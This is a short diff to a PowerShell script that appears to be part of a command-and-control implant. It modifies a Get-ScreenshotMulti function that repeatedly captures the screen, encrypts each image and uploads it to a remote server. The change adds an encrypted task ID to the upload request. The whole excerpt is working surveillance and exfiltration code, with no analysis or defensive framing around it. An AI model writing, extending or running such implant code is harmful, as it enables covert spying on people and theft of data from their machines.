@@ -333,14 +333,15 @@ Function Test-ADCredential
 	return $object
 }
 Function Get-ScreenshotMulti {
-    param($Timedelay, $Quantity)
+    param($Timedelay, $Quantity, [string] $TaskId)
 
     if ($Quantity -and $Timedelay) {
         ForEach ($number in 1..[int]$Quantity ) { 
             $Output = Get-Screenshot         
             $Output = Encrypt-String2 $key $Output
             $UploadBytes = getimgdata $Output
-            (Get-Webclient -Cookie $ReadCommand).UploadData("$Server", $UploadBytes)|out-null
+            $eid = Encrypt-String $key $TaskId
+            (Get-Webclient -Cookie $eid).UploadData("$Server", $UploadBytes)|out-null
             Start-Sleep $Timedelay
         }
     }
